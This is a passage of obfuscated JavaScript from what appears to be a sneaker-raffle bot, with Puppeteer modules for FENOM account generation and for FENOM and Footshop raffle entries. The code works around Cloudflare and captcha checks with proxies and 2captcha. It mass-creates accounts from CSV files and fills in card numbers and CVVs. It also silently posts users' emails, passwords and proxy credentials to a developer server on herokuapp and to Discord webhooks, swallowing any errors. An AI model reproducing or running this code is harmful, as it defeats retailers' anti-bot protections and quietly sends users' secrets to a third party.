                                    console['log'](_0x5b6bc2() + '\x20[' + _0x41e7b2['name'] + ']\x20Task\x20' + (_0x39d762 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x20c314 = !![], dupli = !![];
                                    return;
                                }
                                try {
                                    _0x145227 = await _0x14f2e1['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x58e290[0x0] + ':' + _0x58e290[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x145227 = await _0x14f2e1['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x58e290[0x0] + ':' + _0x58e290[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x274368 = await _0x145227['newPage']();
                                await _0x274368['setViewport']({
                                    'width': 0x500 + _0x5c4736(0x1, 0x32),
                                    'height': 0x2d9 + _0x5c4736(0x1, 0x32)
                                });
                                const _0x38ffb0 = await _0x274368['target']()['createCDPSession'](), { windowId: _0x87177f } = await _0x38ffb0['send']('Browser.getWindowForTarget');
                                await _0x274368['authenticate']({
                                    'username': '' + _0x58e290[0x2],
                                    'password': '' + _0x58e290[0x3]
                                }), console['log'](_0x5b6bc2() + '\x20[' + _0x41e7b2['name'] + ']\x20Task\x20' + (_0x39d762 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x274368['goto']('' + _0x313b0b, { 'waitUntil': 'networkidle2' }), console['log'](_0x5b6bc2() + '\x20[' + _0x41e7b2['name'] + ']\x20Task\x20' + (_0x39d762 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0xb9a1a7(0x1388);
                                var _0x2533b1 = await _0x274368['$']('.hcaptcha-box');
                                if (_0x2533b1) {
                                    console['log'](_0x5b6bc2() + '\x20[' + _0x41e7b2['name'] + ']\x20Task\x20' + (_0x39d762 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0xb9a1a7(0x2710);
                                    const _0x27724a = await _0x274368['$']('.hcaptcha-box');
                                    if (_0x27724a)
                                        try {
                                            await _0x27724a['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x274368['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x4e8cf0 = await _0x274368['$']('.hcaptcha-box');
                                        if (_0x4e8cf0)
                                            try {
                                                await _0x4e8cf0['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x274368['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x38ffb0['send']('Browser.setWindowBounds', {
                                        'windowId': _0x87177f,
                                        'bounds': { 'windowState': 'minimized' }
                                    }), await _0xb9a1a7(0xfa0);
                                } catch {
                                    throw new Error('Blocked\x20by\x20cloudflare');
                                }
                                console['log'](_0x5b6bc2() + '\x20[' + _0x41e7b2['name'] + ']\x20Task\x20' + (_0x39d762 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x274368['type']('input[name=\x22firstname\x22]', '' + _0x294ac1[_0x39d762]['FirstName']), await _0xb9a1a7(0x1f4), await _0x274368['type']('input[name=\x22lastname\x22]', '' + _0x294ac1[_0x39d762]['LastName']), await _0xb9a1a7(0x1f4), await _0x274368['type']('input[name=\x22email\x22]', '' + _0x294ac1[_0x39d762]['Email']), await _0xb9a1a7(0x1f4), await _0x274368['type']('input[name=\x22password\x22]', '' + _0x294ac1[_0x39d762]['Password']), await _0xb9a1a7(0x258), await _0x274368['$eval']('input[name=\x22psgdpr\x22]', _0x50170c => _0x50170c['click']()), await _0xb9a1a7(0x1f4), console['log'](_0x5b6bc2() + '\x20[' + _0x41e7b2['name'] + ']\x20Task\x20' + (_0x39d762 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x274368['$eval']('#customer-form', _0x586462 => _0x586462['submit']());
                                try {
                                    try {
                                        await _0x274368['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                    } catch {
                                        throw new Error('Succes-response\x20not\x20found');
                                    }
                                    _0x4964c8 = 'no', console['log'](_0x5631d3['green'](_0x5b6bc2() + '\x20[' + _0x41e7b2['name'] + ']\x20Task\x20' + (_0x39d762 + 0x1) + '\x20:\x20Account\x20' + _0x294ac1[_0x39d762]['Email'] + '\x20Generated')), _0xf38118['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x294ac1[_0x39d762]['Email'] + ',' + _0x294ac1[_0x39d762]['Password']);
                                    let _0x3512be = _0x294ac1[_0x39d762];
                                    try {
                                        prxdata = {
                                            'username': _0x1544fc['replace']('#', ''),
                                            'module': _0x41e7b2['name'],
                                            'entrydata': JSON['stringify'](_0x3512be),
                                            'proxy': '' + _0x5d09de[_0x39d762]
                                        };
                                        var _0x581488 = JSON['stringify'](prxdata);
                                        let _0x2ec61a = { 'headers': { 'content-type': 'application/json' } };
                                        await _0x358674['post']('https://jraffles.herokuapp.com/success', _0x581488, _0x2ec61a);
                                    } catch (_0x4b7e67) {
                                    }
                                    try {
                                        _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x296543['succesDEVMSG']);
                                    } catch {
                                    }
                                    await _0x313aa7(_0x54bd15, _0x296543['succesDEVMSG']);
                                } catch (_0x5e4f3c) {
                                    throw new Error('Account\x20generation\x20failed');
                                }
                            } catch (_0x29d6bb) {
                                console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x41e7b2['name'] + ']\x20Task\x20' + (_0x39d762 + 0x1) + '\x20:\x20' + _0x29d6bb)), _0x4d9b0f = '' + _0x29d6bb;
                                var _0x5d16e5 = await _0x530ba6(_0x294ac1[_0x39d762], _0x41e7b2, 'acc', !![], _0x4d9b0f);
                                _0x296543['errorDEV'] = { 'embeds': [_0x5d16e5] }, _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x296543['errorDEV']), await _0x313aa7(_0x4190b7, _0x296543['errorDEV']), _0x4964c8 = 'yes';
                            } finally {
                                _0x145227 && _0x145227['close']();
                                if (_0x4964c8 == 'yes' && _0x384ad7 != 0x5)
                                    return console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x41e7b2['name'] + ']\x20Task\x20' + (_0x39d762 + 0x1) + '\x20:\x20Retrying\x20(' + _0x384ad7 + '\x20/\x205)')), _0x384ad7 = _0x384ad7 + 0x1, _0x4a2ba7--, _0x1c2bff(_0x41e7b2, _0x294ac1, _0x5d09de, _0x39d762, _0x384ad7);
                                _0x4964c8 == 'yes' && _0x384ad7 >= 0x5 && _0x100e1d(_0x294ac1[_0x39d762], _0x41e7b2), !_0x20c314 && (console['log'](_0x5b6bc2() + '\x20[' + _0x41e7b2['name'] + ']\x20Waiting\x20for\x20' + _0x4a50c2['delay'] + '\x20ms'), await _0xb9a1a7(_0x4a50c2['delay'])), _0x4a2ba7--;
                            }
                        }
                        _0x1c2bff(_0x29d000, _0x508b9b, _0x3691c9, _0x102882), !_0x20c314 && await _0xb9a1a7(0x15e);
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x1675ff(_0x549da0, _0x2afade, _0x1e5a02) {
                    _0x14f2e1['use'](_0x3313a5()), _0x14f2e1['use'](_0x2255ea({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4a50c2['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xdd8396 = 0x0; _0xdd8396 < _0x2afade['length']; _0xdd8396++) {
                        if (_0x14f7ce != 'yes')
                            var _0x14f7ce = '', _0x4075ab = 0x0;
                        var _0x3da8c3;
                        try {
                            await _0x2dc03a(_0x2afade, _0xdd8396);
                        } catch {
                            _0x14f7ce = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x5bbc27(_0x549da0['name'] + '\x20Task\x20' + (_0xdd8396 + 0x1) + '\x20/\x20' + _0x2afade['length'] + '\x20||\x20File:\x20' + _0x3d6b41 + '\x20Proxies:\x20' + _0x4629ee);
                        const _0x3e3b04 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x2144fe = Math['round'](Math['random']() * (_0x1e5a02['length'] - 0x1)), _0x148b34 = _0x1e5a02[_0x2144fe]['split'](':'), _0x3a3b13;
                        try {
                            _0x3a3b13 = await _0x14f2e1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x148b34[0x0] + ':' + _0x148b34[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3a3b13 = await _0x14f2e1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x148b34[0x0] + ':' + _0x148b34[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x599bd2 = await _0x3a3b13['newPage'](), _0x4127ef = await _0x599bd2['target']()['createCDPSession'](), { windowId: _0x45b6bb } = await _0x4127ef['send']('Browser.getWindowForTarget');
                            await _0x599bd2['authenticate']({
                                'username': '' + _0x148b34[0x2],
                                'password': '' + _0x148b34[0x3]
                            }), console['log'](_0x5b6bc2() + '\x20[' + _0x549da0['name'] + ']\x20Task\x20' + (_0xdd8396 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x599bd2['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x5b6bc2() + '\x20[' + _0x549da0['name'] + ']\x20Task\x20' + (_0xdd8396 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0xb9a1a7(0x1388);
                            var _0xf9507 = await _0x599bd2['$']('.hcaptcha-box');
                            if (_0xf9507) {
                                console['log'](_0x5b6bc2() + '\x20[' + _0x549da0['name'] + ']\x20Task\x20' + (_0xdd8396 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0xb9a1a7(0x2710);
                                const _0x25fc55 = await _0x599bd2['$']('.hcaptcha-box');
                                if (_0x25fc55)
                                    try {
                                        await _0x25fc55['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x599bd2['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x3a710c = await _0x599bd2['$']('.hcaptcha-box');
                                    if (_0x3a710c)
                                        try {
                                            await _0x3a710c['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            await _0x4127ef['send']('Browser.setWindowBounds', {
                                'windowId': _0x45b6bb,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0xb9a1a7(0x1f40);
                            try {
                                await _0x599bd2['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0xb9a1a7(0x1388), console['log'](_0x5b6bc2() + '\x20[' + _0x549da0['name'] + ']\x20Task\x20' + (_0xdd8396 + 0x1) + '\x20:\x20Logging\x20in'), await _0x599bd2['type']('input[name=\x22email\x22]', '' + _0x2afade[_0xdd8396]['Email']), await _0xb9a1a7(0x1f4), await _0x599bd2['type']('input[name=\x22password\x22]', '' + _0x2afade[_0xdd8396]['Password']), await _0xb9a1a7(0x258), await _0x599bd2['$eval']('#login-form', _0x1e599b => _0x1e599b['submit']()), await _0x599bd2['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0xb9a1a7(0x1f4), await _0x599bd2['goto']('' + _0x2afade[_0xdd8396]['Url']), await _0x599bd2['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x5b6bc2() + '\x20[' + _0x549da0['name'] + ']\x20Task\x20' + (_0xdd8396 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x2afade[_0xdd8396]['Size']);
                            if (_0x2afade[_0xdd8396]['Size'] != 'RANDOM') {
                                var _0x26c7e6 = '\x20' + _0x2afade[_0xdd8396]['Size'] + '\x20';
                                const _0x40443c = await _0x599bd2['$x']('//span[contains(text(),\x20' + _0x26c7e6 + ')]');
                                await _0x40443c[0x0]['click']();
                            } else {
                                const _0x4d58eb = await _0x599bd2['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x190bbe = Math['round'](Math['random']() * (_0x4d58eb['length'] - 0x1));
                                await _0x4d58eb[_0x190bbe]['click']();
                            }
                            await _0xb9a1a7(0x258), await _0x599bd2['click']('#cookieChoiceDismiss'), await _0xb9a1a7(0x3e8), await _0x599bd2['type']('#instagram-account', '' + _0x2afade[_0xdd8396]['Follower']), await _0xb9a1a7(0x28a), await _0x599bd2['click']('#book-btn'), await _0xb9a1a7(0xbb8);
                            try {
                                await _0x599bd2['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0xb9a1a7(0x1f4), console['log'](_0x5b6bc2() + '\x20[' + _0x549da0['name'] + ']\x20Task\x20' + (_0xdd8396 + 0x1) + '\x20:\x20' + _0x5631d3['cyan']('Solving\x20Captcha')), await _0x599bd2['solveRecaptchas'](), console['log'](_0x5b6bc2() + '\x20[' + _0x549da0['name'] + ']\x20Task\x20' + (_0xdd8396 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0xb9a1a7(0x7d0), await _0x599bd2['$eval']('#book-btn-for-sure', _0xb21da0 => _0xb21da0['click']()), await _0xb9a1a7(0x12c), await _0x599bd2['click']('#book-btn-for-sure'), await _0xb9a1a7(0xdac);
                            const _0x5db92f = await _0x599bd2['$eval']('.reservation-popup\x20>\x20.title', _0x4d0d50 => {
                                return _0x4d0d50['innerHTML'];
                            });
                            if (_0x5db92f) {
                                _0x14f7ce = 'no', _0x5207fa(_0x2afade[_0xdd8396], _0x549da0), console['log'](_0x5631d3['green'](_0x5b6bc2() + '\x20[' + _0x549da0['name'] + ']\x20Task\x20' + (_0xdd8396 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x2a9445 = await _0x530ba6(_0x2afade[_0xdd8396], _0x549da0, 'dev', ![]), _0x4aac92 = await _0x530ba6(_0x2afade[_0xdd8396], _0x549da0, 'pub', ![]);
                                let _0x50cb39 = _0x2afade[_0xdd8396];
                                try {
                                    prxdata = {
                                        'username': _0x1544fc['replace']('#', ''),
                                        'module': _0x549da0['name'],
                                        'entrydata': JSON['stringify'](_0x50cb39),
                                        'proxy': '' + _0x1e5a02[_0xdd8396]
                                    };
                                    var _0x2c874e = JSON['stringify'](prxdata);
                                    let _0x36f855 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x358674['post']('https://jraffles.herokuapp.com/success', _0x2c874e, _0x36f855);
                                } catch (_0x3ead0b) {
                                }
                                const _0x3e4fe6 = {
                                    'succesDEVMSG': { 'embeds': [_0x2a9445] },
                                    'succesPUBMSG': { 'embeds': [_0x4aac92] }
                                };
                                try {
                                    _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x3e4fe6['succesDEVMSG']), await _0xb9a1a7(0xc8), await _0x313aa7(_0x495189, _0x3e4fe6['succesDEVMSG']), await _0xb9a1a7(0xc8), await _0x313aa7(_0x40302c, _0x3e4fe6['succesPUBMSG']);
                                } catch (_0x3e6551) {
                                    console['log'](_0x5631d3['yellow'](_0x5b6bc2() + '\x20[' + _0x549da0['name'] + ']\x20Task\x20' + (_0xdd8396 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x3e6551));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x3c8135) {
                            console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x549da0['name'] + ']\x20Task\x20' + (_0xdd8396 + 0x1) + '\x20:\x20' + _0x3c8135)), _0x3da8c3 = '' + _0x3c8135;
                            var _0xeeb43b = await _0x530ba6(_0x2afade[_0xdd8396], _0x549da0, 'dev', !![], _0x3da8c3), _0x2a9445 = await _0x530ba6(_0x2afade[_0xdd8396], _0x549da0, 'dev', ![]), _0x4aac92 = await _0x530ba6(_0x2afade[_0xdd8396], _0x549da0, 'pub', ![]);
                            const _0xe314d4 = {
                                'succesDEVMSG': { 'embeds': [_0x2a9445] },
                                'succesPUBMSG': { 'embeds': [_0x4aac92] }
                            };
                            _0xe314d4['errorDEV'] = { 'embeds': [_0xeeb43b] }, _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0xe314d4['errorDEV']), await _0x313aa7(_0x4190b7, _0xe314d4['errorDEV']), _0x3c8135 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x14f7ce = 'yes');
                        } finally {
                            _0x3a3b13['close']();
                            if (_0x14f7ce == 'yes' && _0x4075ab != 0x5 && _0x3da8c3 != 'Size\x20Not\x20Found') {
                                console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x549da0['name'] + ']\x20Task\x20' + (_0xdd8396 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4075ab + '\x20/\x205)')), _0xdd8396 = _0xdd8396 - 0x1, _0x4075ab = _0x4075ab + 0x1;
                                continue;
                            }
                            _0x14f7ce == 'yes' && _0x4075ab >= 0x5 && (_0x100e1d(_0x2afade[_0xdd8396], _0x549da0), _0x14f7ce = 'no', _0x4075ab = 0x0), console['log'](_0x5b6bc2() + '\x20[' + _0x549da0['name'] + ']\x20Waiting\x20for\x20' + _0x4a50c2['delay'] + '\x20ms'), await _0xb9a1a7(_0x4a50c2['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x658d6b, _0x3986c1, _0x5e2aee) {
                _0x14f2e1['use'](_0x3313a5()), _0x14f2e1['use'](_0x2255ea({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x4a50c2['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x2132a2 = 0x0; _0x2132a2 < _0x3986c1['length']; _0x2132a2++) {
                    var _0x3b295d;
                    if (_0x2250f5 != 'yes')
                        var _0x2250f5 = '', _0x55631e = 0x0;
                    var _0x3d3369 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x1544fc
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x3986c1[_0x2132a2]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x3986c1[_0x2132a2]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x4a50c2['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x539abe
                            }
                        ]
                    }], _0x51cc00 = await _0x530ba6(_0x3986c1[_0x2132a2], _0x658d6b, 'dev', ![]), _0x58cc04 = await _0x530ba6(_0x3986c1[_0x2132a2], _0x658d6b, 'pub', ![]);
                    const _0x201cee = {
                        'succesDEVMSG': { 'embeds': [_0x51cc00] },
                        'succesPUBMSG': { 'embeds': [_0x58cc04] }
                    }, _0x5f0e86 = { 'embeds': _0x3d3369 };
                    try {
                        await _0x2dc03a(_0x3986c1, _0x2132a2);
                    } catch {
                        _0x2250f5 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x3986c1[_0x2132a2]['Email'] == '' || _0x3986c1[_0x2132a2]['FirstName'] == '' || _0x3986c1[_0x2132a2]['LastName'] == '' || _0x3986c1[_0x2132a2]['Country'] == '' || _0x3986c1[_0x2132a2]['Size'] == '' || _0x3986c1[_0x2132a2]['Address1'] == '' || _0x3986c1[_0x2132a2]['Zip'] == '') {
                        console['log'](_0x5b6bc2() + '\x20[' + _0x658d6b['name'] + ']\x20Task\x20' + (_0x2132a2 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x3986c1[_0x2132a2]['Email'] == '' || _0x3986c1[_0x2132a2]['FirstName'] == '' || _0x3986c1[_0x2132a2]['LastName'] == '' || _0x3986c1[_0x2132a2]['Country'] == '' || _0x3986c1[_0x2132a2]['Size'] == '' || _0x3986c1[_0x2132a2]['Address1'] == '' || _0x3986c1[_0x2132a2]['Zip'] == '' || _0x3986c1[_0x2132a2]['Phone'] == '') {
                        console['log'](_0x5b6bc2() + '\x20[' + _0x658d6b['name'] + ']\x20Task\x20' + (_0x2132a2 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x171645 = '' + _0x3986c1[_0x2132a2]['Url'];
                    if (_0x4a50c2['useRandomProxy'] = ![])
                        var _0x155a80 = _0x5e2aee[_0x2132a2]['split'](':');
                    else
                        var _0x47e26 = Math['round'](Math['random']() * (_0x5e2aee['length'] - 0x1)), _0x155a80 = _0x5e2aee[_0x47e26]['split'](':');
                    var _0x59bc29;
                    try {
                        _0x59bc29 = await _0x14f2e1['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x155a80[0x0] + ':' + _0x155a80[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x59bc29 = await _0x14f2e1['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x155a80[0x0] + ':' + _0x155a80[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x599f2a = await _0x59bc29['newPage']();
                        await _0x599f2a['authenticate']({
                            'username': '' + _0x155a80[0x2],
                            'password': '' + _0x155a80[0x3]
                        }), console['log'](_0x5b6bc2() + '\x20[' + _0x658d6b['name'] + ']\x20Task\x20' + (_0x2132a2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x599f2a['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x599f2a['setRequestInterception'](!![]), _0x599f2a['on']('request', _0x4afc4f => {
                            _0x4afc4f['resourceType']() === 'image' || _0x4afc4f['resourceType']() === 'font' || _0x4afc4f['resourceType']() === 'media' ? _0x4afc4f['abort']() : _0x4afc4f['continue']();
                        });
                        try {
                            await _0x599f2a['goto'](_0x171645), await _0xb9a1a7(0xbb8), await _0x599f2a['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x599f2a['click']('.control__JhutY'), await _0xb9a1a7(0x1f4);
                        if (_0x3986c1[_0x2132a2]['Size'] != 'RANDOM')
                            try {
                                const _0x35a7b6 = await _0x599f2a['$x']('//div[contains(text(),\x20\x27' + _0x3986c1[_0x2132a2]['Size'] + '\x27)]');
                                await _0x35a7b6[0x0]['click']();
                            } catch {
                                console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x658d6b['name'] + ']\x20Task\x20' + (_0x2132a2 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x56f183 = await _0x599f2a['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x157656 = Math['round'](Math['random']() * (_0x56f183['length'] - 0x1));
                            await _0x56f183[_0x157656]['click']();
                        }
                        await _0xb9a1a7(0x4b0);
                        const _0x31a767 = await _0x599f2a['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x31a767[0x0]['click'](), await _0x599f2a['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x5b6bc2() + '\x20[' + _0x658d6b['name'] + ']\x20Task\x20' + (_0x2132a2 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x599f2a['type']('input[name=\x22email\x22]', '' + _0x3986c1[_0x2132a2]['Email']), await _0xb9a1a7(0x640), await _0x599f2a['type']('input[name=\x22phone\x22]', '' + _0x3986c1[_0x2132a2]['Phone']), await _0xb9a1a7(0x4b0), await _0x599f2a['click']('button.btn.continue-button__1RtsS'), await _0xb9a1a7(0x4b0);
                        try {
                            await _0x599f2a['type']('input[name=\x22firstName\x22]', '' + _0x3986c1[_0x2132a2]['FirstName']), await _0xb9a1a7(0x258);
                        } catch {
                            const _0xa24139 = await _0x599f2a['$$eval']('.invalid-feedback\x20>\x20div', _0x5d8044 => {
                                return _0x5d8044['map'](_0xaa3fd7 => _0xaa3fd7['innerText']);
                            });
                            console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x658d6b['name'] + ']\x20Task\x20' + (_0x2132a2 + 0x1) + '\x20:\x20' + _0xa24139));
                            continue;
                        }
                        await _0x599f2a['type']('input[name=\x22lastName\x22]', '' + _0x3986c1[_0x2132a2]['LastName']), await _0xb9a1a7(0xc8), await _0x599f2a['type']('input[name=\x22instagramUsername\x22]', '' + _0x3986c1[_0x2132a2]['Follower']), await _0xb9a1a7(0x4b0), await _0x599f2a['click']('button.btn.continue-button__1RtsS'), await _0xb9a1a7(0x3e8), console['log'](_0x5b6bc2() + '\x20[' + _0x658d6b['name'] + ']\x20Task\x20' + (_0x2132a2 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x599f2a['select']('select[name=\x22country\x22]', '' + _0x3986c1[_0x2132a2]['Country']), await _0xb9a1a7(0x2bc), await _0x599f2a['type']('input[name=\x22streetName\x22]', '' + _0x3986c1[_0x2132a2]['Address1']), await _0xb9a1a7(0x258), await _0x599f2a['type']('input[name=\x22houseNumber\x22]', _0x3986c1[_0x2132a2]['HouseNumber'] + '\x20' + _0x3986c1[_0x2132a2]['Address2']), await _0xb9a1a7(0xc8), await _0x599f2a['type']('input[name=\x22postalCode\x22]', '' + _0x3986c1[_0x2132a2]['Zip']), await _0xb9a1a7(0x1f4), await _0x599f2a['type']('input[name=\x22city\x22]', '' + _0x3986c1[_0x2132a2]['City']), await _0xb9a1a7(0x4b0), await _0x599f2a['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0xb9a1a7(0x4b0), await _0x599f2a['click']('button.btn.continue-button__1RtsS'), await _0xb9a1a7(0x4b0), console['log'](_0x5b6bc2() + '\x20[' + _0x658d6b['name'] + ']\x20Task\x20' + (_0x2132a2 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x599f2a['solveRecaptchas'](), console['log'](_0x5b6bc2() + '\x20[' + _0x658d6b['name'] + ']\x20Task\x20' + (_0x2132a2 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0xb9a1a7(0xbb8), await _0x599f2a['click']('button.btn.continue-button__1RtsS'), await _0xb9a1a7(0x1388), console['log'](_0x5b6bc2() + '\x20[' + _0x658d6b['name'] + ']\x20Task\x20' + (_0x2132a2 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x599f2a['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x599f2a['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xb9a1a7(0x4b0), await _0x599f2a['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x3986c1[_0x2132a2]['CardNumber']), await _0xb9a1a7(0x320), await _0x599f2a['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x599f2a['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x3986c1[_0x2132a2]['ExpiryDate']), await _0xb9a1a7(0x4b0), await _0x599f2a['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x599f2a['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x3986c1[_0x2132a2]['CVV']), await _0xb9a1a7(0x226), await _0x599f2a['type']('input[name=\x22holderName\x22]', '' + _0x3986c1[_0x2132a2]['NameOnCard']), await _0xb9a1a7(0x226), await _0x599f2a['click']('button.adyen-checkout__button'), console['log'](_0x5b6bc2() + '\x20[' + _0x658d6b['name'] + ']\x20Task\x20' + (_0x2132a2 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x599f2a['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0xb9a1a7(0xbb8);
                        } catch (_0x2eb59d) {
